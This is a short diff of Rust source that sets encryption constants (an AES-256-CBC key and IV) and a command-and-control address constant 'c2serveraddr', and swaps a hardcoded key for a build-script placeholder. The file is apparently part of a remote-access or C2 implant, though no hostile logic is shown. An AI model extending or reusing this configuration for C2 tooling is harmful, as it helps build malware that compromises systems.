@@ -18,7 +18,7 @@ use reqwest::blocking::{Client, Request};
 
 type Aes256Cbc = Cbc<Aes256, Pkcs7>;
 
-const KEY: &[u8] = b"kYmfk8pkMkgR9nj3EQ4x0JuJn6Qwq0cQ";
+const KEY: &[u8] = b"tobereplacedbybuildscript";
 const IV: &[u8] = b"unique_initializ"; // IV should be 16 bytesA
 const C2ADDR: &str = "c2serveraddr";
 const GID: i32 = 4444;
